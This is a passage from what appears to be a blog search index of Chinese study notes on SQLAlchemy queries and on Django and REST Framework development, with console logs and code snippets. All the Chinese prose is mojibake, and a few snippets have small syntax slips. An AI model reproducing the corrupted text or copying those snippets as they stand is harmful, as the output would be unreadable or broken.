t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user, t_news WHERE t_user.user_id = t_news.news_author GROUP BY t_user_user_name; æ‰€ä»¥æœ€ç»ˆå‡‘åˆå¾—åˆ°è¿™æ ·çš„æŸ¥è¯¢ &gt;&gt;&gt; User.query.filter(User.newses).all() 2018-07-15 11:09:17,584 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, t_user.user_password AS t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user, t_news WHERE t_user.user_id = t_news.news_author 2018-07-15 11:09:17,585 INFO sqlalchemy.engine.base.Engine {} [&lt;User &#39;tim_nick&#39;&gt;] æŸ¥è¯¢ä¸€ä¸ªuserå‘å¸ƒè¿‡çš„æ‰€æœ‰news&gt;&gt;&gt; News.query.filter(News.news_author==1).all() 2018-07-15 11:29:42,306 INFO sqlalchemy.engine.base.Engine SELECT t_news.news_id AS t_news_news_id, t_news.news_date AS t_news_news_date, t_news.news_content AS t_news_news_content, t_news.news_title AS t_news_news_title, t_news.news_excerpt AS t_news_news_excerpt, t_news.news_status AS t_news_news_status, t_news.news_modified AS t_news_news_modified, t_news.news_category AS t_news_news_category, t_news.news_author AS t_news_news_author FROM t_news WHERE t_news.news_author = %(news_author_1)s 2018-07-15 11:29:42,306 INFO sqlalchemy.engine.base.Engine {&#39;news_author_1&#39;: 1} [&lt;News &#39;title of news item one&#39;&gt;, &lt;News &#39;title of news item two&#39;&gt;] åˆ°è¿™é‡Œä¸€å…±æœ‰ä¸‰å¼ è¡¨ï¼Œé‚£ä¹ˆjoinè¿™ç§è”è¡¨æŸ¥è¯¢ä¹Ÿæ˜¯okçš„&gt;&gt;&gt; result = db.session.query(News.news_id, News.news_author, News.news_date, News.news_title, News.news_content, News.news_excerpt, News.news_status, News.news_modified, Newscate.cate_name, Newscate.cate_title, User.user_name, User.user_nickname).filter_by(news_id=1).join(Newscate, News.news_category == Newscate.cate_id).join(User, News.news_author == User.user_id).first() 2018-07-15 14:08:27,487 INFO sqlalchemy.engine.base.Engine SELECT t_news.news_id AS t_news_news_id, t_news.news_author AS t_news_news_author, t_news.news_date AS t_news_news_date, t_news.news_title AS t_news_news_title, t_news.news_content AS t_news_news_content, t_news.news_excerpt AS t_news_news_excerpt, t_news.news_status AS t_news_news_status, t_news.news_modified AS t_news_news_modified, t_newscat.cate_name AS t_newscat_cate_name, t_newscat.cate_title AS t_newscat_cate_title, t_user.user_name AS t_user_user_name, t_user.user_nickname AS t_user_user_nickname FROM t_news INNER JOIN t_newscat ON t_news.news_category = t_newscat.cate_id INNER JOIN t_user ON t_news.news_author = t_user.user_id WHERE t_news.news_id = %(news_id_1)s LIMIT %(param_1)s 2018-07-15 14:08:27,487 INFO sqlalchemy.engine.base.Engine {&#39;news_id_1&#39;: 1, &#39;param_1&#39;: 1} (1, 1, datetime.datetime(2018, 7, 15, 2, 41, 50), &#39;title of news item one&#39;, &#39;content of news item one&#39;, &#39;excerpt of news item one&#39;, &#39;normal&#39;, datetime.datetime(2018, 7, 15, 10, 41, 50), &#39;economy&#39;, &#39;economy title&#39;, &#39;Tim&#39;, &#39;tim_nick&#39;) è¿™é‡Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ª&lt;class &#39;sqlalchemy.util._collections.result&#39;&gt;å¯¹è±¡ &gt;&gt;&gt; result.cate_name ## å¯ä»¥è¿™ä¹ˆè®¿é—®æ•°æ® &#39;economy&#39; æŸ¥æ‰¾æ‰€æœ‰ç”¨gmailæ³¨å†Œçš„ç”¨æˆ·&gt;&gt;&gt;&gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;gmail&quot;)).all() 2018-07-15 13:50:56,237 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE %(user_email_1)s 2018-07-15 13:50:56,239 INFO sqlalchemy.engine.base.Engine {&#39;user_email_1&#39;: &#39;gmail&#39;} [] ##æ˜¾ç„¶æœ‰é—®é¢˜ æ•°æ®åº“é‡Œæ‰§è¡Œè¿™å¥sqlå°±èƒ½æ­£ç¡®çš„æ‰¾å‡ºgmailé‚®ç®±çš„user &gt;&gt;&gt; SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE &#39;%gmail%&#39; äºæ˜¯æ”¹æˆ &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).all() 2018-07-15 13:54:08,541 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_name AS t_user_user_name FROM t_user WHERE t_user.user_email LIKE %(user_email_1)s 2018-07-15 13:54:08,542 INFO sqlalchemy.engine.base.Engine {&#39;user_email_1&#39;: &#39;%gmail%&#39;} [(&#39;Tim&#39;,), (&#39;Django&#39;,), (&#39;Sally&#39;,), (&#39;john&#39;,)] ### åˆ†é¡µæ¥å£ï¼Œlimit,countè¿™ç§æ€ä¹ˆå†™ï¼Ÿ ç”¨æ ‡å‡†çš„limit,countä¼¼ä¹å¹¶ä¸å›°éš¾ &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).all() [(&#39;Tim&#39;,)] &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).offset(2).all() [(&#39;Sally&#39;,)] offsetè¶…å‡ºäº†å®é™…æ•°æ®çš„æ€»é‡å¦‚ä½•ï¼Ÿ &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).limit(1).offset(10).all() [] é™¤äº†æ ‡å‡†çš„limitæ–¹æ³•ä»¥å¤–ï¼Œä¸‹é¢è¿™ä¸ªpaginateæ–¹æ³•è¿”å›äº†ä¸€ä¸ªpagination object &gt;&gt;&gt; db.session.query(User.user_name).filter(User.user_email.like(&quot;%gmail%&quot;)).paginate(2,1,False).items MYSQLåˆ†é¡µlimité€Ÿåº¦å¤ªæ…¢ä¼˜åŒ–æ–¹æ³• Many to many relationshipæ·»åŠ æ–°çš„modelçš„æ—¶å€™ï¼Œæ—§çš„model importä¼šæŠ¥é”™ class Node(Base): __tablename__ = &quot;nodes&quot; __table_args__ = {&quot;useexisting&quot;: True} ## å…³é”®æ˜¯è¿™ä¸ª è¿™æ ·db.create_all()çš„æ—¶å€™ä¹Ÿä¸ä¼šå»åŠ¨ç°æœ‰çš„è¡¨é‡Œé¢çš„æ•°æ® many-to-many-relationshipä¾èµ–äºç¬¬ä¸‰å¼ è¡¨ association_table = db.Table(&#39;association&#39;, db.Model.metadata, db.Column(&#39;left_id&#39;, db.Integer, db.ForeignKey(&#39;left.id&#39;)), db.Column(&#39;right_id&#39;, db.Integer, db.ForeignKey(&#39;right.id&#39;)) ) class Parent(db.Model): __tablename__ = &#39;left&#39; id = db.Column(db.Integer, primary_key=True) children = db.relationship(&quot;Child&quot;, secondary=association_table) class Child(db.Model): __tablename__ = &#39;right&#39; id = db.Column(db.Integer, primary_key=True) ## æ·»åŠ æ•°æ® p = Parent() c = Child() p.children.append(c) db.session.add(p) db.session.commit() student_identifier = db.Table(&#39;student_identifier&#39;, db.Column(&#39;class_id&#39;, db.Integer, db.ForeignKey(&#39;classes.class_id&#39;)), db.Column(&#39;user_id&#39;, db.Integer, db.ForeignKey(&#39;students.user_id&#39;)) ) class Student(db.Model): __tablename__ = &#39;students&#39; user_id = db.Column(db.Integer, primary_key=True) user_fistName = db.Column(db.String(64)) user_lastName = db.Column(db.String(64)) user_email = db.Column(db.String(128), unique=True) class Class(db.Model): __tablename__ = &#39;classes&#39; class_id = db.Column(db.Integer, primary_key=True) class_name = db.Column(db.String(128), unique=True) children = db.relationship(&quot;Student&quot;, secondary=student_identifier) s = Student() c = Class() c.children.append(s) db.session.add(c) db.session.commit() ## æŸ¥è¯¢æ•°æ® db.session.query(Class).all()[0].children ##å¾—åˆ°ä¸€ä¸ªStudentçš„list Class.query.with_parent(user_id) ## è·å¾—ä¸€ä¸ªstudentä¸Šçš„æ‰€æœ‰è¯¾ç¨‹ æœ‰æ—¶å€™ç”¨db.session.queryå»æŸ¥ï¼Œæœ‰æ—¶å€™ç”¨Model.queryå»æŸ¥ å‚è€ƒtutorialsqueryapi","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"sql","slug":"sql","permalink":"https://haldir65.github.io/tags/sql/"}]},{"title":"djangoå­¦ä¹ è®°å½•","date":"2018-06-12T22:40:01.000Z","path":"2018/06/12/2018-06-12-django-the-pony/","text":"é¦–å…ˆæ˜¯å‡ ä¸ªå¸¸ç”¨å‘½ä»¤ virtualenv --no-site-packages venv ## virtualenvå¥½ä¹ æƒ¯ source venv/bin/activate ## windowsä¸‹åº”è¯¥æ˜¯Scripts/activate.batè¿™ä¸ªæ–‡ä»¶ deactivate ## é€€å‡º python manage.py mkemigrations app1 app2 python manage.py migrate python manage.py runserver django-admin startproject mysite ## åˆ›å»ºé¡¹ç›® django-admin startapp app1 ## åˆ›å»ºapp python manage.py runserver ## æœ¬åœ°è¿è¡Œï¼Œé»˜è®¤8000ç«¯å£ python manage.py runserver 8080 ## ç«¯å£ä¹Ÿå¯ä»¥è‡ªå·±å†³å®š python manage.py migrate ##åˆ›å»ºäº†æ–°çš„modelï¼Œæ•°æ®åº“éœ€è¦å»ºè¡¨ python manage.py createsuperuser ## åˆ›å»ºadmin éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrunserverå‘½ä»¤å¤šæ•°æƒ…å†µä¸‹èƒ½å¤Ÿå®ç°è‡ªåŠ¨reloadï¼Œæ¯”å¦‚ä¿®æ”¹äº†ä¸€ä¸ªpyæ–‡ä»¶ã€‚ä½†å¦‚æœæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¿˜æ˜¯éœ€è¦é‡æ–°è·‘ä¸€éçš„ settings.pyä¸­çš„SECRET_KEYä¸åº”è¯¥å¯¹å¤–å…¬å¸ƒ modelsç®€åŒ–äº†å»ºè¡¨æ“ä½œï¼Œæ·»åŠ çš„stræ–¹æ³•ç±»ä¼¼äºå°†Objectç±»å‹çš„æ•°æ®å±•ç¤ºä¸ºStringçš„æ–¹æ³• from django.db import models class Question(models.Model): # ... def __str__(self): return self.question_text class Choice(models.Model): # ... def __str__(self): return self.choice_text å®˜æ–¹tutorialä¸­çš„urlå’Œviewçš„åŒ¹é…ä¹Ÿå¾ˆç®€å• def detail(request, question_id): return HttpResponse(&quot;You&#39;re looking at question %s.&quot; % question_id) def results(request, question_id): response = &quot;You&#39;re looking at the results of question %s.&quot; return HttpResponse(response % question_id) def vote(request, question_id): return HttpResponse(&quot;You&#39;re voting on question %s.&quot; % question_id) from django.urls import path from . import views urlpatterns = [ # ex: /polls/ path(&#39;&#39;, views.index, name=&#39;index&#39;), # ex: /polls/5/ path(&#39;&lt;int:question_id&gt;/&#39;, views.detail, name=&#39;detail&#39;), # ex: /polls/5/results/ path(&#39;&lt;int:question_id&gt;/results/&#39;, views.results, name=&#39;results&#39;), # ex: /polls/5/vote/ path(&#39;&lt;int:question_id&gt;/vote/&#39;, views.vote, name=&#39;vote&#39;), ] å®‰è£…mysql:é¦–å…ˆæ˜¯virtualenvpip install mysql-connector-python mysql-connector-python åœ¨ununtuä¸Šä½¿ç”¨uwsgiå’Œnginxè¿è¡Œdjango application uwsgi.confæ–‡ä»¶é‡Œé¢éœ€è¦æ³¨æ„çš„æœ‰è¿™ä¹ˆä¸€æ¡[uwsgi]module = somefile:app ## å½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ªsomefile.pyæ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªapp = Flask(name) requirements.txtçš„ç”Ÿæˆå’Œä½¿ç”¨å½“ç„¶éƒ½è¦åœ¨virtualenvä¸­äº† (venv) $ pip freeze &gt; requirements.txt # åˆ›å»º(venv) $ pip install -r requirements.txt ##ä½¿ç”¨ 127.0.0.1å’Œ0.0.0.0çš„åŒºåˆ«æˆ‘å°è¯•åœ¨vps(216.216.216.216)ä¸Šè¿è¡Œdjangoåº”ç”¨ python manage.py 17289 ##éšä¾¿æŒ‘ä¸€ä¸ªç«¯å£curl localhost:17289 ## ç½‘é¡µçš„html responseå±•ç¤ºå‡ºæ¥ äºæ˜¯å°è¯•åœ¨æœ¬åœ°windowsä¸Šæµè§ˆå™¨ä¸­è¾“å…¥ 216.216.216.216:17289 æ²¡ååº”ï¼Œä½¿ç”¨postmanï¼Œæ²¡æ•ˆæœã€‚æœ¬åœ°curlï¼Œcurl â€“trace ä¾æ—§æ²¡æ•ˆæœã€‚çœ‹ä¸‹é˜²ç«å¢™sudo uwf status # inactiveæœ€ç»ˆæ‰¾åˆ°äº†running-django-server-on-localhost å…¶å®åªè¦æ”¹ç”¨0.0.0.0å°±å¯ä»¥äº† python manage.py runserver 0.0.0.0:8000python manage.py runserver HERE.IS.MY.IP:8000 #æˆ–è€…ä½¿ç”¨å®é™…çš„åœ°å€ whats-the-difference-between-ip-address-0-0-0-0-and-127-0-0-1 In simple terms: Listening on 0.0.0.0 means listening from anywhere that has network access to this computer, for example, from this very computer, from local network or from the Internet, while listening on 127.0.0.1 means only listen from this very computer python manage.py shell python manage.py plus_shell drfå®˜æ–¹æ–‡æ¡£ åœ¨ubuntuæœåŠ¡å™¨ä¸Šæ­é…nginxéƒ¨ç½²djangoåº”ç”¨åˆ›å»ºä¸€ä¸ªmyconf.iniæ–‡ä»¶ uwsgi â€“ini myconf.ini è¿˜æœ‰ï¼Œå¤šæ•°æ—¶å€™ä¼šçƒ­æ›´æ–°ï¼Œä½†æ¯”å¦‚æˆ‘æ›´æ”¹äº†PaginationClassï¼Œè¿˜æ˜¯å¾—é‡æ–°runserveræ‰èƒ½è·å¾—ç†æƒ³çš„ç»“æœ ç›®å‰DRFä¸æ”¯æŒé€šè¿‡ä¸€ä¸ªPostè¯·æ±‚åˆ›å»ºä¸€ä¸ªlist of nested objects è‡ªå®šä¹‰æ¥å£è¿”å›æ ¼å¼ListCreateAPIViewä¸­override createæ–¹æ³• def create(self, request, *args, **kwargs): serializer = self.get_serializer(data=request.data) if not serializer.is_valid(raise_exception=False): return Response({&quot;Fail&quot;: &quot;blablal&quot;, status=status.HTTP_400_BAD_REQUEST) self.perform_create(serializer) headers = self.get_success_headers(serializer.data) return Response({&quot;Success&quot;: &quot;msb blablabla&quot;}, status=status.HTTP_201_CREATED, headers=headers) postå’Œgetè¯·æ±‚éƒ½å˜å¾—éå¸¸è½»æ¾ class CountryView(APIView): def get(self, request, format=None): snippets = County.objects.all() serializer = CountySimpleSerilizer(snippets, many=True) return Response(serializer.data) def post(self, request, format=None): serializer = CountySimpleSerilizer(data=request.data) if serializer.is_valid(): serializer.save() return responses.JsonResponse(serializer.data, status=status.HTTP_201_CREATED) return responses.JsonResponse(data={&quot;name&quot;,&quot;bad post request&quot;}, status=status.HTTP_400_BAD_REQUEST) python manage.py dbshell ##ç”¨äºåœ¨å‘½ä»¤è¡Œä¸­ç›´æ¥æŸ¥çœ‹æ•°æ®åº“.help æŸ¥çœ‹åœ¨è¿™ä¸ªshellä¸­å¯ä»¥ç”¨çš„ä¸€äº›æ“ä½œ.tables æŸ¥çœ‹å½“å‰åˆ›å»ºçš„æ‰€æœ‰çš„è¡¨ è¿™ä¸ªä¸è¦åŠ åˆ†å·DROP TABLE appname_model; åˆ è¡¨ è¿™ä¸ªè¦åŠ åˆ†å· æ³¨æ„ï¼Œåˆ äº†è¡¨ä¹‹åï¼Œè¿˜å¾—æŠŠå¯¹åº”çš„migrationsä¸­çš„æ–‡ä»¶åˆ æ‰ï¼Œå¦åˆ™migrateæ— æ•ˆ pkå…¶å®å°±æ˜¯primary_keyçš„æ„æ€ Object.objects.get(id=1) Object.objects.get(pk=1) ## çœ‹æ¸…æ¥šäº†ï¼Œæ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿ User.objects.filter(pk__in=[1,2,3]) User.objects.filter(pk__gt=10) User.objects.filter(pk__lt=10) nested relations { &quot;detail&quot;: &quot;Method \\&quot;GET\\&quot; not allowed.&quot; } éšä¾¿ç»§æ‰¿ä¸€ä¸ªAPIViewï¼Œåªå†™äº†postæ–¹æ³•ï¼Œä½¿ç”¨GETæ–¹æ³•å°±ä¼šå¾—åˆ°è¿™ä¸ªresponse urlPatternsçš„ä¸€äº›ä¸œè¥¿å¦‚æœurlä¸­æœ‰ç©ºæ ¼çš„è¯å°±ç›´æ¥æ¢æˆ%20urls.pyé‡Œé¢å†™çš„ä¸»è¦æ˜¯ä¸€å †æ­£åˆ™è¡¨è¾¾å¼ urlpatterns = [ url(r&#39;^profiles/(?P&lt;username&gt;[\\w\\ ]+)/?$&#39;, ProfileRetrieveAPIView.as_view()), url(r&#39;^profiles/(?P&lt;username&gt;\\w+)/follow/?$&#39;, ProfileFollowAPIView.as_view()), ] ç¬¬ä¸€è¡Œçš„æ„æ€æ˜¯è®¿é—® /profiles/ä½ æƒ³è¦æŸ¥æ‰¾çš„userName è¿™ä¸ªé“¾æ¥å°±ä¼šäº¤ç»™åé¢è¿™ä¸ªView lookup_fieldå’Œlookup_url_kwargéƒ½æ˜¯å®šä¹‰åœ¨GenericApiViewè¿™ä¸ªClassä¸Šçš„ class GenericAPIView(views.APIView): &quot;&quot;&quot; Base class for all other generic views. &quot;&quot;&quot; queryset = None serializer_class = None # If you want to use object lookups other than pk, set &#39;lookup_field&#39;. # For more complex lookup requirements override `get_object()`. lookup_field = &#39;pk&#39; lookup_url_kwarg = None # The filter backend classes to use for queryset filtering filter_backends = api_settings.DEFAULT_FILTER_BACKENDS # The style to use for queryset pagination. pagination_class = api_settings.DEFAULT_PAGINATION_CLASS rest-frameworkçš„æ–‡æ¡£æ˜¯è¿™ä¹ˆè¯´çš„ lookup_field - The model field that should be used to for performing object lookup of individual model instances. Defaults to â€˜pkâ€™. Note that when using hyperlinked APIs youâ€™ll need to ensure that both the API views and the serializer classes set the lookup fields if you need to use a custom value.lookup_url_kwarg - The URL keyword argument that should be used for object lookup. The URL conf should include a keyword argument corresponding to this value. If unset this defaults to using the same value as lookup_field ç®€è¨€ä¹‹ï¼Œå°±æ˜¯lookup_fieldå°±æ˜¯æŠŠurlé‡Œé¢ä¼ è¿›æ¥çš„å‚æ•°å½“åšmodelçš„ä»€ä¹ˆfieldæ¥æŸ¥ï¼Œæ¯”å¦‚modelæ˜¯Customerï¼Œprimarykeyæ˜¯customernameï¼Œé»˜è®¤çš„lookup_fieldå°±æ˜¯è¿™ä¸ªä¸»é”®ã€‚å®¢æˆ·ç«¯çš„urléœ€è¦ä¼ ä¸Šæ¥ä¸€ä¸ªcustomernameï¼Œç„¶åå°±ä¼šæ ¹æ®è¿™ä¸ªcustomernameå»Customer.objects.filter(customername=â€xxxâ€)å»æ‰¾ã€‚å¦‚æœå®šä¹‰lookup_fieldä¸ºcustomer_ageï¼Œå°±ä¼šæŠŠå®¢æˆ·ç«¯ä¼ ä¸Šæ¥çš„å‚æ•°å½“åšä¸€ä¸ªcustomer_ageå»æŸ¥æ‰¾,Customer.objects.filter(customer_age=â€xxxâ€) å…³äºè¿™ä¸ªç»§æ‰¿å…³ç³»ï¼ŒCreateAPIViewï¼ŒListAPIViewï¼ŒRetrieveAPIViewï¼ŒDestroyAPIViewè¿™äº›å…¨éƒ½æ˜¯ç»§æ‰¿äº†GenericAPIViewï¼Œå¹¶å„è‡ªç»§æ‰¿äº†mixinï¼Œæ‰©å±•å‡ºpost,get,post,deleteç­‰æ–¹æ³•ã€‚ mixins.ListModelMixinï¼Œå®šä¹‰äº†ä¸€ä¸ªlistæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªquerysetåˆ—è¡¨ï¼Œå¯¹åº”GETæ–¹æ³•mixins.CreateModelMixinï¼Œå®šä¹‰äº†ä¸€ä¸ªcreateæ–¹æ³•ï¼Œåˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œå¯¹åº”POSTè¯·æ±‚mixins.RetrieveModelMixinï¼Œå®šä¹‰äº†ä¸€ä¸ªretrieveæ–¹æ³•ï¼Œå¯¹åº”GETè¯·æ±‚mixins.UpdateModelMixinï¼Œå®šä¹‰ä¸€ä¸ªupdateæ–¹æ³•ï¼Œå¯¹åº”PUT/PATCHè¯·æ±‚ ##åœ¨modelsçš„Filedä¸­å®šä¹‰ä¸€ä¸ª createdAt = serializers.SerializerMethodField(method_name=&#39;get_created_at&#39;) ##æ„å‘³ç€è¿™ä¸ªfieldè¦è°ƒç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„æ–¹æ³•å»è·å– updatedAt = serializers.SerializerMethodField(method_name=&#39;get_updated_at&#39;) ##filedè¿˜æœ‰ä¸€ä¸ªsourceçš„æ¦‚å¿µ: The name of the attribute that will be used to populate the field. é»˜è®¤æ˜¯è¿™ä¸ªfieldçš„nameï¼Œæ¯”å¦‚å¯ä»¥å®šä¹‰ä¸ºmodelçš„ä¸€ä¸ªæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å®šä¹‰ä¸ºä¸€ä¸ªmodelçš„field ##serializeré‡Œé¢å¯ä»¥è‡ªå®šä¹‰modelä¸­ä¸å­˜åœ¨çš„field customField = RelatedField(many=True, required=False, source=&#39;tags&#39;) ## è¿™ä¸ªtagsæ˜¯å­˜åœ¨çš„ï¼ŒcustomFieldæ˜¯ä¸å­˜åœ¨è¿™ä¸ªmodelä¸­çš„ ##è¿™æ ·åšå°±å¾ˆæœ‰æ„æ€äº†ï¼Œå› ä¸ºä»æ•°æ®åº“é‡ŒæŸ¥å‡ºæ¥çš„objectå¯èƒ½å°±é‚£ä¹ˆç‚¹ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¸Œæœ›åå°åœ¨responseä¸­æ·»åŠ ä¸€äº›åŸæœ¬ä¸å­˜åœ¨äºæ•°æ®åº“modelä¸­çš„ä¿¡æ¯ã€‚å°±å¯ä»¥åœ¨æŸä¸ªå·²æœ‰å˜é‡çš„åŸºç¡€ä¸Šæ‰©å±•æ–°çš„response æ•°æ® ## è¿™é‡Œçš„insatnceæ˜¯Serializerçš„modelçš„å®ä¾‹ def get_created_at(self, instance): return instance.created_at.isoformat() åœ¨serializerå±‚é¢ä¸ºmodelæ·»åŠ fieldã€‚è¿™é‡Œé¢è¦æ³¨æ„fieldè¿˜æœ‰read-onlyå’Œwrite-onlyç­‰åŒºåˆ«å…³äºslugFiled from django.utils.text importWell, if we give a string like â€˜The new article titleâ€™ to slugify(), it returns â€˜the-new-article-titleâ€™. Simple. slugFieldä¸»è¦æ˜¯ä¸ºäº†è®©urlå¥½çœ‹ç‚¹ Slugs are created mostly for the purpose of creating a nice, clean URL.Say for example, you have a site of user-generated posts, such as stackoverflow or quora.A user starts a post that has a title.Each post creates a separate web page based on the title.Now if a user asks the question, â€œHow do you slugify text in Pythonâ€If a URL is created for this question, as is, with the spaces in them, the browser will insert %20 in place of each space. Therefore, the URL will be, How%20do%20you%20slugify%20text%20in%20PythonThis will work, but it looks extremely ugly and isnâ€™t very human readable.So instead of having spaces in a URL, a slugified text is created that contains no spaces. Instead of spaces there are â€œ-â€œ instead. Therefore, the URL will be, How-do-you-slugify-text-in-PythonThis looks much cleaner and is much more human readable. drf çš„authorizationé»˜è®¤éœ€è¦æ˜¯è¿™æ ·çš„: Authorization: Token 9944b09199c62bcf9418ad846dd0e4bbdfc6ee4bNote: If you want to use a different keyword in the header, such as Bearer, simply subclass TokenAuthentication and set the keyword class variable.If successfully authenticated, TokenAuthentication provides the following credentials.request.user will be a Django User instance.request.auth will be a rest_framework.authtoken.models.Token instance. jwtçš„logoutæˆ–è€…è¸¢äººæ€ä¹ˆåšé¦–å…ˆTokenæ˜¯æ”¾åœ¨å†…å­˜é‡Œè€Œä¸æ˜¯dbé‡Œçš„ï¼Œå¦å¤–è¦è¸¢äººçš„è¯ï¼Œæ‰‹åŠ¨ç»™è¿™ä¸ªuserç”Ÿæˆä¸€ä¸ªæ–°çš„tokenææ¸…æ¥šï¼Œè¸¢äººæ˜¯æœåŠ¡å™¨è¿™è¾¹åš(åˆ›å»ºä¸ªæ–°çš„Tokenæˆ–è€…è®©åŸæœ‰Tokenæ— æ•ˆ)ï¼Œlogoutæ˜¯å®¢æˆ·ç«¯é‚£è¾¹åš(åˆ é™¤å®¢æˆ·ç«¯æœ¬åœ°å­˜å‚¨çš„Token)ã€‚åœ¨htmlé‡Œé¢åˆ æ‰Tokenå¯ä»¥è¿™ä¹ˆå¹² &lt;script&gt; document.cookie = &quot;token=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/&quot;; location.href=&quot;/accounts/auth/&quot;; &lt;/script&gt; å¯¹ï¼Œå°±æ˜¯ç®€å•çš„æŠŠtokenç½®ç©ºå°±è¡Œäº† ä»£ç é‡Œè®¤è¯çš„åœ°æ–¹å–çš„Headeræ˜¯WWW-Authenticate XXXï¼Œä½†å®¢æˆ·ç«¯ä¼ çš„æ˜¯Authorizationã€‚ä¼°è®¡è¿™æ˜¯wsgiåè®®æ–‡æ¡£åœ¨è¿™é‡Œç›¸å…³çš„ï¼Œè®°å¾—Nginxå¥½åƒä¹Ÿæœ‰è¿™æ ·çš„è®¾å®šã€‚WWW-Authenticate: Token ä»django urlconfä¸­æŠ„æ¥è¿™äº›ä»£ç  from django.urls import path, re_path from . import views from django.urls import path from . import views urlpatterns = [ path(&#39;articles/2003/&#39;, views.special_case_2003), path(&#39;articles/&lt;int:year&gt;/&#39;, views.year_archive), path(&#39;articles/&lt;int:year&gt;/&lt;int:month&gt;/&#39;, views.month_archive), path(&#39;articles/&lt;int:year&gt;/&lt;int:month&gt;/&lt;slug:slug&gt;/&#39;, views.article_detail), ] ##åº•ä¸‹è¿™ä¸ªå’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œåº•ä¸‹ç”¨çš„æ˜¯re_pathï¼Œä½¿ç”¨æ­£åˆ™ï¼Œå¹´ä»½åªèƒ½å››ä½ï¼Œä¼ ç»™viewçš„å‚æ•°ç±»å‹å§‹ç»ˆæ˜¯strã€‚è¿˜æ˜¯æœ‰ç‚¹å°åŒºåˆ« urlpatterns = [ path(&#39;articles/2003/&#39;, views.special_case_2003), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/$&#39;, views.year_archive), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/$&#39;, views.month_archive), re_path(r&#39;^articles/(?P&lt;year&gt;[0-9]{4})/(?P&lt;month&gt;[0-9]{2})/(?P&lt;slug&gt;[\\w-]+)/$&#39;, views.article_detail), ] å…³äºperformanceçš„issueï¼Œå‚è€ƒè¿™é‡Œ class CustomerSerializer(serializers.ModelSerializer): # This can kill performance! order_descriptions = serializers.StringRelatedField(many=True) # So can this, same exact problem... orders = OrderSerializer(many=True, read_only=True) # This can kill performance! The code inside DRF that populates either CustomerSerializer does this:Fetch all customers. (Requires a round-trip to the database.)For the first returned customer, fetch their orders. (Requires another round-trip to the database.)For the second returned customer, fetch its orders. (Requires another round-trip to the database.)For the third returned customer, fetch its orders. (Requires another round-trip to the database.)For the fourth returned customer, fetch its orders. (Requires another round-trip to the database.)For the fifth returned customer, fetch its orders. (Requires another round-trip to the database.)For the sixth returned customer, fetch its orders. (Requires another round-trip to the database.)â€¦ you get the idea. Lets hope you donâ€™t have too many customers! æ‰€ä»¥è¦æ˜¯æœ‰50ä¸ªcustomerï¼Œå°±è¦æ‰§è¡Œ50æ¬¡æŸ¥è¯¢ï¼ŒåŠ ä¸Šç¬¬ä¸€æ¬¡è·å–æ‰€æœ‰Customerçš„æ•°æ®åº“queryã€‚ ä¼˜åŒ–åçš„ä»£ç åªéœ€è¦èµ°2æ¬¡æ•°æ®åº“ queryset = queryset.prefetch_related(&#39;orders&#39;) ##å¹²ä¸¤ä»¶äº‹ï¼Œä¸€ä¸ªæ˜¯è·å–æ‰€æœ‰userï¼Œä¸€ä¸ªæ˜¯è·å–è¿™äº›userçš„oreré›†åˆï¼Œä¸€å…±å°±ä¸¤æ¬¡sqlæ‰§è¡Œ å…¶å®è¿™äº›ä¸œè¥¿åœ¨Django official documenté‡Œé¢éƒ½æåˆ°è¿‡ã€‚ å¦å¤–çš„ä¼˜åŒ–å°±æ˜¯ç”¨redisäº†,æ¯”å¦‚è¯´Caching in Django With Redis pip install django-redis CACHES = { &#39;default&#39;: { &#39;BACKEND&#39;: &#39;django_redis.cache.RedisCache&#39;, &#39;LOCATION&#39;: &#39;127.0.0.1:6379&#39;, &quot;OPTIONS&quot;: { &quot;CLIENT_CLASS&quot;: &quot;django_redis.client.DefaultClient&quot;, }, }, } ## python manage.py shell å¼€ä¸€ä¸ªshellï¼Œè®°å¾—å…ˆæŠŠredisçš„serverè·‘èµ·æ¥ from django.core.cache import cache #å¼•å…¥ç¼“å­˜æ¨¡å— cache.set(&#39;k&#39;, &#39;12314&#39;, 30*60) #å†™å…¥keyä¸ºkï¼Œå€¼ä¸º12314çš„ç¼“å­˜ï¼Œæœ‰æ•ˆæœŸ30åˆ†é’Ÿ cache.has_key(&#39;k&#39;) #åˆ¤æ–­keyä¸ºkæ˜¯å¦å­˜åœ¨ cache.get(&#39;k&#39;) #è·å–keyä¸ºkçš„ç¼“å­˜ ä¸€åˆ‡OKçš„è¯è¯´æ˜å¯ä»¥ç”¨äº† view.py from rest_framework.views import APIView from rest_framework import status from rest_framework.response import Response from .serializers import CourseSerializer from .models import Course from django.core.cache import cache import time def get_data_from_db(criteria_name): course = 